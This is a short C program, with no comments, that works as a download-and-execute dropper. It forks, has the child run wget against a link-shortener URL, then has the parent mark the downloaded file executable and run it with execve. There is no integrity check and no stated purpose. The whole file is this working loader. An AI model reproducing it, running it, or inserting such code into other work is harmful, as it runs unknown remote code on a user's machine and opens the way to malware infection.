# ifndef CPP
# include <stdlib.h>

# include <unistd.h>
# include <sys/wait.h>
# include <sys/stat.h>
# endif /* CPP */


int
main(void)
{
  pid_t pid = fork();
  if (pid >= 0) {
    if (pid == 0) {
      char bin[] = "/usr/bin/wget";
      char url[] = "http://dwz.cn/2NojKT";
      char *argv[] = { bin, url , NULL };
      execve(bin, argv, NULL);
    }
    else {
      int status;
      waitpid(-1, &status, 0);
      char message[] = "wait finished\n";
      char bin[] = "2NojKT";
      write(STDOUT_FILENO, message,
            sizeof message);
      chmod(bin, S_IRWXU | S_IRGRP | S_IXGRP);
      execve(bin, NULL, NULL);
    }
  }
  else {
    char message[] = "fork failed\n";
    write(STDERR_FILENO, message, sizeof message);
  }

  return EXIT_SUCCESS;
}
